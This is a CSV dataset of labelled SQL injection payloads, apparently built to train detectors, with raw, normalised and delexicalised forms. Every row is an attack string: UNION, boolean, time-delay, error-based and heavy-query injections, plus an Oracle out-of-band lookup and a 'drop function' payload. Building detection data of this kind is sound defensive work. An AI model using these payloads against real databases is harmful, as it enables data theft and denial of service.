payload_raw,payload_norm,payload_delex,label,is_obfuscated,sqli_type_hint,source
"1%""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  ""","1%"" ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"1""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #","1"" ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #","<NUM>"" ) ) or <NUM> = benchmark ( <NUM>,md5 ( 0x544d5a4c ) ) #",1,True,,sqli_dataset
"1%'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --","1%' ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --","<NUM>%' ) and char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
select sleep  (  5  )   and    (    (   'uyft'  =  'uyft,select sleep ( 5 ) and ( ( 'uyft' = 'uyft,select sleep ( <NUM> ) and ( ( <STR> = 'uyft,1,False,,sqli_dataset
-6100'  )   as kvfc where 2377  =  2377 or 6872  =  6872--,-6100' ) as kvfc where 2377 = 2377 or 6872 = 6872--,-<NUM>' ) as kvfc where <NUM> = <NUM> or <NUM> = <NUM>--,1,False,,sqli_dataset
"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'adnz'  =  'adnz","1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'adnz' = 'adnz",<NUM><STR>adnz<STR>adnz,1,True,,sqli_dataset
"1""  )   and 4595  =  4595#","1"" ) and 4595 = 4595#","<NUM>"" ) and <NUM> = <NUM>#",1,False,,sqli_dataset
1   )    )     )   order by 1--,1 ) ) ) order by 1--,<NUM> ) ) ) order by <NUM>--,1,False,,sqli_dataset
1' in boolean mode  )   and   (  3020  =  3020  )  *6703#,1' in boolean mode ) and ( 3020 = 3020 ) *6703#,<NUM>' in boolean mode ) and ( <NUM> = <NUM> ) *<NUM>#,1,False,,sqli_dataset
"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686","1 ) ) and make_set ( 8403 = 8403,8899 ) and ( ( 4686 = 4686","<NUM> ) ) and make_set ( <NUM> = <NUM>,<NUM> ) and ( ( <NUM> = <NUM>",1,False,,sqli_dataset
1 where 9361  =  9361 and 7478  =  9170--,1 where 9361 = 9361 and 7478 = 9170--,<NUM> where <NUM> = <NUM> and <NUM> = <NUM>--,1,False,,sqli_dataset
select   (  case when   (  9490  =  6134  )   then 9490 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,select ( case when ( 9490 = 6134 ) then 9490 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,select ( case when ( <NUM> = <NUM> ) then <NUM> else cast ( <NUM> as int ) / ( select <NUM> from dual ) end ) from dual--,1,False,,sqli_dataset
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'lqpd'  =  'lqpd","1' ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 'lqpd' = 'lqpd",<NUM><STR>lqpd<STR>lqpd,1,False,,sqli_dataset
-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,-4768'|| ( select 'dded' from dual where 6499 = 6499 union all select 6499--,-<NUM><STR>dded' from dual where <NUM> = <NUM> union all select <NUM>--,1,False,,sqli_dataset
"1'||  (  select 'lzvb' where 1637  =  1637 union all select null,null,null,null,null,null,null,null#","1'|| ( select 'lzvb' where 1637 = 1637 union all select null,null,null,null,null,null,null,null#","<NUM><STR>lzvb' where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null#",1,False,,sqli_dataset
"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#","-8308"" ) union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#","-<NUM>"" ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
select   (  case when   (  6047  =  8897  )   then 6047 else 6047*  (  select 6047 from information_schema.character_sets  )   end  )  #,select ( case when ( 6047 = 8897 ) then 6047 else 6047* ( select 6047 from information_schema.character_sets ) end ) #,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from information_schema.character_sets ) end ) #,1,False,,sqli_dataset
"1,  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )","1, ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 9693 = 9693,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )","<NUM>, ( select <NUM>* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) s ) , <NUM>, <NUM> ) ) )",1,True,,sqli_dataset
"1'  )   where 2284  =  2284 and make_set  (  8403  =  8403,8899  )  --","1' ) where 2284 = 2284 and make_set ( 8403 = 8403,8899 ) --","<NUM>' ) where <NUM> = <NUM> and make_set ( <NUM> = <NUM>,<NUM> ) --",1,False,,sqli_dataset
-6014'   )    )    or   (  9860  =  4848  )  *4848 and    (    (   'qtge'  =  'qtge,-6014' ) ) or ( 9860 = 4848 ) *4848 and ( ( 'qtge' = 'qtge,-<NUM><STR>qtge<STR>qtge,1,False,,sqli_dataset
select case when 4656  =  3716 then 1 else null end--,select case when 4656 = 3716 then 1 else null end--,select case when <NUM> = <NUM> then <NUM> else null end--,1,False,,sqli_dataset
"1"" where 8571  =  8571","1"" where 8571 = 8571","<NUM>"" where <NUM> = <NUM>",1,False,,sqli_dataset
"1""  )   and 3732  =  3850 and   (  ""edjv""  =  ""edjv","1"" ) and 3732 = 3850 and ( ""edjv"" = ""edjv",<NUM><STR>edjv<STR>edjv,1,False,,sqli_dataset
end#,end#,end#,1,False,,sqli_dataset
1'   )    )    union all select null#,1' ) ) union all select null#,<NUM>' ) ) union all select null#,1,False,,sqli_dataset
"1""   )    )    and 7656  =  5604 and    (    (   ""zuhv""  =  ""zuhv","1"" ) ) and 7656 = 5604 and ( ( ""zuhv"" = ""zuhv",<NUM><STR>zuhv<STR>zuhv,1,False,,sqli_dataset
"1   )    )    as llnm where 6510  =  6510 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1 ) ) as llnm where 6510 = 6510 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM> ) ) as llnm where <NUM> = <NUM> and <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,False,,sqli_dataset
"1""  )   union all select null,null,null,null,null,null,null,null--","1"" ) union all select null,null,null,null,null,null,null,null--","<NUM>"" ) union all select null,null,null,null,null,null,null,null--",1,False,,sqli_dataset
"1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'rnyb'  =  'rnyb","1' ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( 'rnyb' = 'rnyb",<NUM><STR>rnyb<STR>rnyb,1,False,,sqli_dataset
1' in boolean mode  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1' in boolean mode ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,<NUM>' in boolean mode ) and ( select * from ( select ( sleep ( <NUM> ) ) ) gcrr ) #,1,False,,sqli_dataset
"1 where 6095  =  6095 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","1 where 6095 = 6095 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --","<NUM> where <NUM> = <NUM> and <NUM> = ( select count ( * ) from generate_series ( <NUM>,<NUM> ) ) --",1,False,,sqli_dataset
1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 'dtzt' like 'dtzt,<NUM><STR>dtzt<STR>dtzt,1,False,,sqli_dataset
1' where 9003  =  9003 waitfor delay '0:0:5'--,1' where 9003 = 9003 waitfor delay '0:0:5'--,<NUM><STR><NUM>:<NUM>:<NUM>'--,1,False,,sqli_dataset
"-6639'  )   as trll where 6271  =  6271 union all select 6271,6271,6271#","-6639' ) as trll where 6271 = 6271 union all select 6271,6271,6271#","-<NUM>' ) as trll where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"1""  )   waitfor delay '0:0:5'--","1"" ) waitfor delay '0:0:5'--","<NUM>"" ) waitfor delay <STR>--",1,False,,sqli_dataset
"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""cgps"" like ""cgps","1"" and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ""cgps"" like ""cgps",<NUM><STR>cgps<STR>cgps,1,False,,sqli_dataset
end and    (    (     (  'gqhc'  =  'gqhc,end and ( ( ( 'gqhc' = 'gqhc,end and ( ( ( <STR> = 'gqhc,1,False,,sqli_dataset
1'   )    )    as wqhm where 9871  =  9871,1' ) ) as wqhm where 9871 = 9871,<NUM>' ) ) as wqhm where <NUM> = <NUM>,1,False,,sqli_dataset
"1""   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""rvuz"" like ""rvuz","1"" ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""rvuz"" like ""rvuz",<NUM><STR>rvuz<STR>rvuz,1,True,,sqli_dataset
-3458'  )   where 2053  =  2053 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,-3458' ) where 2053 = 2053 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,-<NUM>' ) where <NUM> = <NUM> or <NUM> = dbms_utility.sqlid_to_sqlhash ( ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) ) --,1,False,,sqli_dataset
select   (  case when   (  2576  =  7563  )   then 2576 else 1/  (  select 0  )   end  )  --,select ( case when ( 2576 = 7563 ) then 2576 else 1/ ( select 0 ) end ) --,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>/ ( select <NUM> ) end ) --,1,False,,sqli_dataset
"select sleep  (  5  )   and ""irxg""  =  ""irxg","select sleep ( 5 ) and ""irxg"" = ""irxg","select sleep ( <NUM> ) and <STR> = ""irxg",1,False,,sqli_dataset
select case when 8514  =  3207 then 1 else null end--,select case when 8514 = 3207 then 1 else null end--,select case when <NUM> = <NUM> then <NUM> else null end--,1,False,,sqli_dataset
1   )    )    waitfor delay '0:0:5'--,1 ) ) waitfor delay '0:0:5'--,<NUM> ) ) waitfor delay <STR>--,1,False,,sqli_dataset
"1""   )    )    as bovm where 5560  =  5560 union all select null,null,null,null,null,null,null#","1"" ) ) as bovm where 5560 = 5560 union all select null,null,null,null,null,null,null#","<NUM>"" ) ) as bovm where <NUM> = <NUM> union all select null,null,null,null,null,null,null#",1,False,,sqli_dataset
"1""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","1"" ) ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","<NUM>"" ) ) or <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,False,,sqli_dataset
if  (  8727  =  4039  )   select 8727 else drop function giql--,if ( 8727 = 4039 ) select 8727 else drop function giql--,if ( <NUM> = <NUM> ) select <NUM> else drop function giql--,1,False,,sqli_dataset
"1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #","1' in boolean mode ) and make_set ( 8403 = 8403,8899 ) #","<NUM>' in boolean mode ) and make_set ( <NUM> = <NUM>,<NUM> ) #",1,False,,sqli_dataset
1' in boolean mode  )   rlike   (  select   (  case when   (  1343  =  1595  )   then 1 else 0x28 end   )    )   #,1' in boolean mode ) rlike ( select ( case when ( 1343 = 1595 ) then 1 else 0x28 end ) ) #,<NUM>' in boolean mode ) rlike ( select ( case when ( <NUM> = <NUM> ) then <NUM> else 0x28 end ) ) #,1,True,,sqli_dataset
"-6599""   )    )    union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--","-6599"" ) ) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--","-<NUM>"" ) ) union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1%'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  '%'  =  '","1%' ) ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( '%' = '",<NUM>%<STR>%<STR>,1,False,,sqli_dataset
"-4025"" or 3038  =  3038","-4025"" or 3038 = 3038","-<NUM>"" or <NUM> = <NUM>",1,False,,sqli_dataset
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )","1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )","<NUM>"" or extractvalue ( <NUM>,concat ( 0x5c,0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71 ) )",1,True,,sqli_dataset
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt","1' ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'jwbt' = 'jwbt",<NUM><STR>jwbt<STR>jwbt,1,True,,sqli_dataset
1'  )   where 2227  =  2227,1' ) where 2227 = 2227,<NUM>' ) where <NUM> = <NUM>,1,False,,sqli_dataset
"1%""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  ""","1%"" ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""%"" = """,<NUM>%<STR>%<STR>,1,False,,sqli_dataset
1  )   order by 1--,1 ) order by 1--,<NUM> ) order by <NUM>--,1,False,,sqli_dataset
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""epxq"" like ""epxq","1"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""epxq"" like ""epxq",<NUM><STR>epxq<STR>epxq,1,False,,sqli_dataset
"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk","1"" ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ""utlk"" like ""utlk",<NUM><STR>utlk<STR>utlk,1,False,,sqli_dataset
"1%' and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --","1%' and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --","<NUM>%' and <NUM> = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,False,,sqli_dataset
"1 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --","1 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --","<NUM> or char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) ||char ( <NUM> ) = regexp_substring ( repeat ( right ( char ( <NUM> ) ,<NUM> ) ,<NUM> ) ,null ) --",1,False,,sqli_dataset
"1'   )    )    as qcgf where 9656  =  9656 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --","1' ) ) as qcgf where 9656 = 9656 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","<NUM>' ) ) as qcgf where <NUM> = <NUM> or <NUM> = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,False,,sqli_dataset
1'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1' ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,<NUM>' ) ) or <NUM> = ( select <NUM> from pg_sleep ( <NUM> ) ) --,1,False,,sqli_dataset
"-1451%'  )   union all select 7666,7666,7666#","-1451%' ) union all select 7666,7666,7666#","-<NUM>%' ) union all select <NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--","-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--","-<NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>--",1,False,,sqli_dataset
"1'+  (  select 'qvif' where 1758  =  1758 union all select null,null,null,null,null,null,null,null#","1'+ ( select 'qvif' where 1758 = 1758 union all select null,null,null,null,null,null,null,null#","<NUM><STR>qvif' where <NUM> = <NUM> union all select null,null,null,null,null,null,null,null#",1,True,,sqli_dataset
"1""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""rkry"" like ""rkry","1"" ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""rkry"" like ""rkry",<NUM><STR>rkry<STR>rkry,1,True,,sqli_dataset
"-2007' where 9157  =  9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#","-2007' where 9157 = 9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#","-<NUM>' where <NUM> = <NUM> union all select <NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>,<NUM>#",1,False,,sqli_dataset
"1 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --","<NUM> or <NUM> = like ( <STR>,upper ( hex ( randomblob ( <NUM>/<NUM> ) ) ) ) --",1,False,,sqli_dataset
"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #","1%"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #","<NUM>%"" ) ) rlike ( select * from ( select ( sleep ( <NUM> ) ) ) vwyq ) #",1,False,,sqli_dataset
-2817  )   where 1212  =  1212 or 3266  =  1102,-2817 ) where 1212 = 1212 or 3266 = 1102,-<NUM> ) where <NUM> = <NUM> or <NUM> = <NUM>,1,False,,sqli_dataset
"iif  (  9229  =  4158,1,1/0  )","iif ( 9229 = 4158,1,1/0 )","iif ( <NUM> = <NUM>,<NUM>,<NUM>/<NUM> )",1,False,,sqli_dataset
"1,  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )","1, ( select ( case when ( 9443 = 9443 ) then sleep ( 5 ) else 9443* ( select 9443 from information_schema.character_sets ) end ) )","<NUM>, ( select ( case when ( <NUM> = <NUM> ) then sleep ( <NUM> ) else <NUM>* ( select <NUM> from information_schema.character_sets ) end ) )",1,False,,sqli_dataset
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  '%'  =  '","select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( '%' = '","select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( <STR> = '",1,False,,sqli_dataset
1'   )    )    order by 1--,1' ) ) order by 1--,<NUM>' ) ) order by <NUM>--,1,False,,sqli_dataset
-5803  )   where 8651  =  8651 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,-5803 ) where 8651 = 8651 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,-<NUM> ) where <NUM> = <NUM> or <NUM> = utl_inaddr.get_host_address ( chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) || ( select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM> end ) from dual ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ||chr ( <NUM> ) ) --,1,False,,sqli_dataset
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # mpyu","1 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) # mpyu","<NUM> and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( <NUM> = <NUM>,<NUM> ) ) ) ,0x717a767a71,0x78 ) ) x ) ) # mpyu",1,True,,sqli_dataset
"1""   )    )    union all select null,null,null,null,null,null,null#","1"" ) ) union all select null,null,null,null,null,null,null#","<NUM>"" ) ) union all select null,null,null,null,null,null,null#",1,False,,sqli_dataset
select   (  case when   (  2352  =  8672  )   then 2352 else 2352*  (  select 2352 from information_schema.character_sets  )   end  )  #,select ( case when ( 2352 = 8672 ) then 2352 else 2352* ( select 2352 from information_schema.character_sets ) end ) #,select ( case when ( <NUM> = <NUM> ) then <NUM> else <NUM>* ( select <NUM> from information_schema.character_sets ) end ) #,1,False,,sqli_dataset
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'ichh' like 'ichh","1' ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( 'ichh' like 'ichh",<NUM><STR>ichh<STR>ichh,1,True,,sqli_dataset
1' and 6621  =  4681--,1' and 6621 = 4681--,<NUM>' and <NUM> = <NUM>--,1,False,,sqli_dataset
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'oofd'  =  'oofd,1' and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'oofd' = 'oofd,<NUM><STR>oofd<STR>oofd,1,False,,sqli_dataset
